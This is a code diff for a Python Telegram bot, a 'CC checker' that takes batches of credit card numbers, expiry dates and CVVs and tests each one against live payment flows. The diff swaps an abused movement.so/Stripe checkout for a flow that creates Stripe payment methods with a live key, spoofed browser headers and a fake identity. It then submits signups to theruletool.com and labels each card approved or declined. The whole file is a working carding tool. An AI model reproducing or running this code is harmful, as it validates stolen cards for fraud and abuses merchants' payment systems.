@@ -29,188 +29,135 @@ def parse_cards(text):
                 cards.append((cc, mm, yy, cvv))
     return cards
 
-def safe_json_parse(response):
+def get_stripe_pm(email, cc, mm, yy, cvv):
+    guid = str(uuid4())
+    muid = str(uuid4())
+    sid = str(uuid4())
+    phone = "(314)474-6658"
+    data = {
+        "type": "card",
+        "billing_details[email]": email,
+        "billing_details[name]": "John Doe",
+        "billing_details[phone]": phone,
+        "card[number]": cc,
+        "card[cvc]": cvv,
+        "card[exp_month]": mm,
+        "card[exp_year]": yy[-2:],
+        "guid": guid,
+        "muid": muid,
+        "sid": sid,
+        "payment_user_agent": "stripe.js/9e39ef88d1; stripe-js-v3/9e39ef88d1; card-element",
+        "referrer": "https://app.theruletool.com",
+        "time_on_page": str(random.randint(10000, 99999)),
+        "key": "pk_live_IEQsNdUrbZuQsRHI0yPFlzwM00D623ymrA",
+        # You must supply a valid hcaptcha token for real requests
+        "radar_options[hcaptcha_token]": "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiVmdQZFJwRjhFUjhuU2t6V2h6bjdtZklPNzliOGZJVFBpcnFoUTJXQWJtRG4rSEFHNVQwcTVoZFU2WlRlVDZ6NGNGMEUrdWpWbWVRbnVkWVBueEM1R0pGNEZLdU44Y2crcHBpZ3Uza00zNFpxMUdFWnV2eEpnY2pJeVFUTlBrR3VBVVI0anArb3R5RTdsMDJtVjZ0SFpkbXJvSEs1QVBDY3BOSVMwdFZSMUk2cFRtS3RDTUtKZEJNSlp3VVdHc1pseVlwcEsxYkVyampjUFVSTk9sK1RuUUZsbTROY0ZtNkRGT0trT0VaQVZCNERjbG45RDE4RGU1b1M5MlYxMXZyUWx6bTYvdXRaRDhGRTV4VGQyY01CbXR3WjlUclBwNjBsaXREcC8xbmxRSlNqaG93ekZSM1lzNkpZVFozRTlHTENZL3lseXNXclFaZE10M2FyNnd0RkhmNXZvUWI5UjZkb3FmYUNUT0c1b1M0MjluYzlDZmF4MVpuRTMzenJOdlZNQmFxUERxQ2VGb3Vmc2FBTlhiNnAwbXIwa0Zib3pCZ1NuM0dyaWdvVC9zbDIzSDQvekt2SWtpL0s0cTVhdG5XZXNjcVprMmJwU0hLS0IwTUUvT21Oc1ZEVWdGNUpvNEhLb0wzdlZhaSs3WWVZMTVnOFNFUElVNERKVlppTmMzQ2tKWFlDSWI3NjJmdzUyaHdWWjRWalBtdElZZXM3R0loWUJxRjJJazRLZXl2ME8wZ1JOME5MOXUvU2orWFg4SzcrVjVYMXBzdkJWb1BKS1RYWjI0SHlpYkVUQUtoNEduZml2UEVWcnZtdC83N2ZmakhYUzhCck4wc2dzWkhqUDVKZzN0ZkxWZ2N0SjR5WmxkdHVRNHV3VnB4WGZocjQ3K3hOWjBjU0hVbVZYNDBMelBwOUpMa1NCUDl3WjhlTHZlQ2VYMHMzTVd5YjZ0eUgwU3o0c01xZEJQeGJjTjVCaVRyQ0JSNmcvaG8zSVluSjVIWGF6dmJVL2NxOVFndHVlLzNOVEgxR3BWc0xWaXdVaDBPQUVIS3Q1UXBDTFZEZlQvenNNb2Z1WnFuSlcvakxXVUxaNkxOTjQxQkg4eXBFSHZ0SlVhSlpMb2J1N3dVcE5KNWVRV0J2cVpnaUJnRE5NclFCUm8xUGhtdFE5aFZXYmpMRTBHRmM1ZXFsd3JGYzMwR1Z3amlwcTBYb2lvOWRXNCtNT2xpakZkdlRGNytSRFRqSmJseWlLSmpBVVp2NjVRT2txMkFNMzVRcjFIMElvdW5mVmJuZFZLaVlLMHpGK09tSWUwdEVHN0k4T2pzZFR3a0hJSmh6SlVrZ081Q0Z1YmJ5dWRnNVc0ZDR3OEk3TlhUdk1MYzNpOE9WVnFOc09oWVVSMnprRWxIK0NLNFduWEtFTzBGcmlCSjhKdTBHME9ES0NlS1EvU1hxa2hPdXhxazRtd2NxL25QVm41bnI0Rnk2QmRkTlQzYS81K3BIZWZPSlkwbE9hL0RyV1FxcnRRYVg4NXFqampZeUpETVhxeFJPcm9YSngvNm9iRHYyTW01eVdGamFtZEx3TWJ2NG1NVVFlYnRhUi9vYzQ2bUczS2tMYVNjb2o0MVpuRWdvSnBIRFBvMXZrSUVRRngxTG12b3BiRUtmYnAxWmdrYWFUcWxkek84cjRORGc3SWsyRkJ5K3VINERBb1FvMWNsakdVYm81b2ZIbFM4Q2tIQXZmQ3J2VXpHVGtOb1UxTW1jaE41Mnlva1kra0JJUjNrdUpOUWVlZEhVbHRQTUlNcHY5STJzMmIxUndsSExCRHZNWnQyd1F5b3VyNDZRMUt0bTZmNlZqdEZOVjM5dWJWZjBReVYwMWtESzZtbTB5Y0MzTThTeWlrUXljODdheUlRQysya3RyMDA0d2JqM3g0Qnk2UVA2V0JzeDNyT09ZQUxubTVLYzVkaFZmemtsOGlCT3IzK2xpSStyUCtBQW9IWGYzUXlIOXEyK3BTRExnNEw1YkpRYUhENmtEN0FxeVpJVjRENFZPTUNwZ2JqVW5yOTlyKzJ4bENCQzdjZW1QbGsxZ3BCRTZveXVSN2lZdVRSVFQwZnpIQUVGTGFZekptM1lVRERxNlBGREdqRmpiczEyYzJ6SWpWVWw1NE9PSjhBdmVpRytQR2hJR0FpUTdsQTdVbHd3S1dNVkpqdS9rK3M1TXkycEptUHpFZldSaHBEQXYxVTlPRzhVTFZBeEVOWkp4MEt3eGJ6d3kwVnFvdWtVSkFZSXBUVXhwZitvT1VJS2ZheEtBYWxCTGg2VkdrMnlZWmVJTE83YVIrbUljUW1WT3lRanEzb0RMM0lmU2tYRUhqOW5Kbkx6MEJwaGQ1MEVueG9CcitZQldKNUhPRHFCVUZQUGN2Y3RqWkkyZExzV0h6TU9UK3QwL0tqOVJZajJHeEhET09BQXk4V2taeVN0bVhDS1o3anJ2NC9MSVZpRHBaMU1rVHFNM1BtWVhyUllFZGJUKzdYaEIxY2tVQnVNeElJL2Q2azBOY1AyTytFaG15TTZoZzViZU9PTXJCYlE4OTBReUMxc2plNzVWcjExUDBGb1E5emVhUjVCcFQ0WjNFeVEyNjBaRG1hYjhTcWZ5bkw2NTh1NHhGb1Z5eWs4YVVzOHF2Z0dpK3M3Vzh5K0lmV3JmcjVXempXVlg4ZC9LaGNiQjdVMDdKYjh0ZXBBS2x4ZVlSSXY3cSswWTFCRm90WEo0M2Z5NytrYzNDVzFxUnFBcnBrVFlGZXNONVB3NmVna2FsRDgwVVl1U1UvaUVlUmV3VlVnY0xqMXUwVXdWWFI5ZjBhRFdDMURiWm9rRnhNMnZzN2FLUE9VZVMrY05GaDFkWGpEeFNERTZaUDY3Z2xFRFBHVUFtRTBrQT09IiwiZXhwIjoxNzQ3MDU2NzY0LCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiMjRlMzgzYjkiLCJwZCI6MCwiY2RhdGEiOiJ1TjJNM2duZ0pLQi84dHhsV25zbGdEeGt1ZDVTNk5rWEZOTytrbkI2dzREV1ZySFBPN2VwK2tIYTZFZ29lbk5oS0xoZmpWSEJnWTFmRFN0cnVTclRXMkUxMDBoZHhVZ1FqZVExT3FnR1lCOStXeGZxMmJNZko2bTJHcjBvWGd6bGxuT3lka0xDTllhK0F6M2JHM0hMclpuajV3M3dqSmxKVDBLYzJIa3BjaWVBYnJuR1V4dDNVV0UzazROVU1xcHVNK0lqVUlNZ21jNERnc2E1In0.EiL7C4ck57anNNbJufiXcmAwfrq4Vsd1vy92cGiflcg"
+    }
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+        "accept": "application/json"
+    }
+    resp = requests.post("https://api.stripe.com/v1/payment_methods", data=data, headers=headers, timeout=30)
     try:
-        return response.json()
+        res_json = resp.json()
+        pm_id = res_json.get("id", "")
+        return pm_id, resp.text
     except Exception:
-        return None
-
-def is_declined(resp_text):
-    if "CHARGEFAILED" in resp_text:
-        return True
-    if '"chargeStatus":"TRANSACTION-CHARGEFAILED"' in resp_text:
-        return True
-    if '"invalidCard":1' in resp_text:
-        return True
-    return False
+        return "", resp.text
 
 @bot.message_handler(commands=['start'])
 def start_handler(message):
     bot.send_message(
         message.chat.id,
-        "Send cards in format:\n"
-        "CC|MM|YY|CVV\n"
-        "CC|MM|YYYY|CVV\n"
-        "CC/MM/YY/CVV\n"
-        "CC/MM/YYYY/CVV\n\n"
-        "Use /stop to cancel."
+        "🔒 RuleTool CC Checker Bot\n\n"
+        "Send credit cards in one of these formats (one per line):\n"
+        "`CC|MM|YY|CVV`\n"
+        "`CC|MM|YYYY|CVV`\n"
+        "`CC/MM/YY/CVV`\n"
+        "`CC/MM/YYYY/CVV`\n\n"
+        "⏳ 15s delay between checks\n"
+        "⏹ Use /stop to cancel processing",
+        parse_mode="Markdown"
     )
 
 @bot.message_handler(commands=['stop'])
 def stop_handler(message):
     user_stop_flag[message.from_user.id] = True
-    bot.send_message(message.chat.id, "Stopped checking.")
+    bot.send_message(message.chat.id, "⏹ Processing stopped")
 
 def check_card_flow(message, cards):
+    from uuid import uuid4
     user_id = message.from_user.id
     chat_id = message.chat.id
     user_stop_flag[user_id] = False
 
-    AUTHORIZATION_VALUE = "Bearer YOUR_LONG_AUTH_TOKEN_HERE"
-
     for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
         if user_stop_flag.get(user_id):
-            bot.send_message(chat_id, "Checking stopped by user.")
+            bot.send_message(chat_id, "⏹️ Checking stopped by user.")
             break
 
         email = random_email()
-        device_id = ''.join(random.choices(string.hexdigits, k=32))
-        session_id = str(int(time.time() * 1000))
-
-        # Step 1: Get authentication_token
-        verify_headers = {
-            "accept": "application/json",
-            "content-type": "application/json",
-            "origin": "https://aroshanti.mvt.so",
-            "referer": "https://aroshanti.mvt.so/",
-            "user-agent": "Mozilla/5.0",
-            "x-account-app": "aroshanti",
-            "x-client-height": "500",
-            "x-client-width": "584",
-            "x-device-id": device_id,
-            "x-native-app": "false",
-            "x-origin-href": "https://aroshanti.mvt.so/buy/10825#checkout/pay",
-            "x-session-id": session_id,
-            "x-standalone": "false"
-        }
-        verify_data = {"email": email, "name": None}
-
-        try:
-            verify_resp = requests.post(
-                "https://api.movement.so/auth/verify_subscriber",
-                headers=verify_headers,
-                json=verify_data,
-                timeout=30
+        pm_id, stripe_raw = get_stripe_pm(email, cc, mm, yy, cvv)
+        if not pm_id or not pm_id.startswith("pm_"):
+            bot.send_message(
+                chat_id,
+                f"Card #{idx}\n"
+                f"Number: {cc}|{mm}|{yy}|{cvv}\n"
+                f"Email: {email}\n"
+                f"Status: ❌ Declined (Stripe error)\n"
+                f"Stripe response:\n<code>{stripe_raw}</code>",
+                parse_mode="HTML"
             )
-            if verify_resp.status_code != 200:
-                bot.send_message(chat_id, f"Card #{idx} - Failed to get auth token. Status: {verify_resp.status_code}\nResponse: {verify_resp.text}")
-                continue
-            verify_json = safe_json_parse(verify_resp)
-            if not verify_json or "authentication_token" not in verify_json:
-                bot.send_message(chat_id, f"Card #{idx} - No authentication_token in response.\nResponse: {verify_resp.text}")
-                continue
-            authentication_token = verify_json["authentication_token"]
-        except Exception as e:
-            bot.send_message(chat_id, f"Card #{idx} - Exception getting auth token: {str(e)}")
             continue
 
-        # Step 2: Get clientSecret
-        intent_headers = {
-            **verify_headers,
-            "x-user-email": email,
-            "x-user-token": authentication_token
-        }
-        intent_data = {
-            "version_id": 25148,
-            "coupon": "",
-            "referral": {},
-            "order_bumps": [],
-            "address": {},
-            "name": None,
-            "final_amount": 0
-        }
-        try:
-            intent_resp = requests.post(
-                "https://api.movement.so/products/10825/intent",
-                headers=intent_headers,
-                json=intent_data,
-                timeout=30
-            )
-            if intent_resp.status_code != 200:
-                bot.send_message(chat_id, f"Card #{idx} - Failed to get clientSecret. Status: {intent_resp.status_code}\nResponse: {intent_resp.text}")
-                continue
-            intent_json = safe_json_parse(intent_resp)
-            if not intent_json or "clientSecret" not in intent_json:
-                bot.send_message(chat_id, f"Card #{idx} - No clientSecret in response.\nResponse: {intent_resp.text}")
-                continue
-            client_secret = intent_json["clientSecret"]
-        except Exception as e:
-            bot.send_message(chat_id, f"Card #{idx} - Exception getting clientSecret: {str(e)}")
-            continue
-
-        # Step 3: Confirm payment on Stripe
-        setup_intent_id = client_secret.split('_secret')[0]
-
-        stripe_url = f"https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm"
-
-        post_data = {
-            "return_url": "https://aroshanti.mvt.so/buy/10825?product_id=10825&guest=true#checkout/callback",
-            "payment_method_data[type]": "card",
-            "payment_method_data[card][number]": cc,
-            "payment_method_data[card][cvc]": cvv,
-            "payment_method_data[card][exp_year]": yy[-2:],
-            "payment_method_data[card][exp_month]": mm,
-            "payment_method_data[allow_redisplay]": "unspecified",
-            "payment_method_data[billing_details][address][country]": "IQ",
-            "payment_method_data[payment_user_agent]": "stripe.js/9e39ef88d1; stripe-js-v3/9e39ef88d1; payment-element; deferred-intent; autopm",
-            "payment_method_data[referrer]": "https://aroshanti.mvt.so",
-            "payment_method_data[time_on_page]": str(random.randint(10000, 99999)),
-            "payment_method_data[client_attribution_metadata][client_session_id]": device_id,
-            "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
-            "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
-            "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
-            "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "deferred",
-            "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "automatic",
-            "payment_method_data[guid]": device_id,
-            "payment_method_data[muid]": device_id[:32],
-            "payment_method_data[sid]": device_id[-32:],
-            "expected_payment_method_type": "card",
-            "client_context[currency]": "gbp",
-            "client_context[mode]": "setup",
-            "client_context[setup_future_usage]": "off_session",
-            "key": "pk_live_TkKfklEHyCsuwMAtIqVRg7dd",
-            "client_secret": client_secret,
-        }
-
-        stripe_headers = {
-            "content-type": "application/x-www-form-urlencoded",
+        # Prepare RuleTool signup/create POST data (as text/plain)
+        signup_url = "https://app.theruletool.com/signup/create"
+        post_data = (
+            f'{{"pm_id":"{pm_id}","email":"{email}","first_name":"John","last_name":"Doe","password":"{random_email()}","confirm_password":"{random_email()}","phone":"(314)474-6658"}}'
+        )
+        headers = {
+            "accept": "*/*",
+            "accept-encoding": "gzip, deflate, br, zstd",
+            "accept-language": "en-US,en;q=0.9",
+            "content-type": "text/plain;charset=UTF-8",
+            "origin": "https://app.theruletool.com",
+            "priority": "u=1, i",
+            "referer": "https://app.theruletool.com/signup",
+            "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": '"Windows"',
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-origin",
             "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
-            "accept": "application/json",
+            "cookie": f"__stripe_mid={pm_id}; __stripe_sid={pm_id}"
         }
-
         try:
-            stripe_resp = requests.post(
-                stripe_url,
-                headers=stripe_headers,
-                data=post_data,
-                timeout=30
-            )
-            stripe_text = stripe_resp.text
-
-            status = "✅ Approved" if "succeeded" in stripe_text else "❌ Dead"
-
+            resp = requests.post(signup_url, data=post_data, headers=headers, timeout=30)
+            resp_text = resp.text
+            if '"IsSuccess":true' in resp_text:
+                status = "✅ Approved"
+            elif '"IsSuccess":false' in resp_text:
+                status = "❌ Declined"
+            else:
+                status = "❓ Unknown"
             bot.send_message(
                 chat_id,
                 f"Card #{idx}\n"
                 f"Number: {cc}|{mm}|{yy}|{cvv}\n"
                 f"Email: {email}\n"
                 f"Status: {status}\n"
-                f"Response:\n<code>{stripe_text}</code>",
+                f"Response:\n<code>{resp_text}</code>",
                 parse_mode="HTML"
             )
-
         except Exception as e:
-            bot.send_message(chat_id, f"❌ Error processing card #{idx}: {str(e)}")
+            bot.send_message(
+                chat_id,
+                f"❌ Error processing card #{idx}\n"
+                f"{cc}|{mm}|{yy}|{cvv}\n"
+                f"Error: {str(e)}"
+            )
 
         if idx < len(cards):
             for i in range(15, 0, -1):
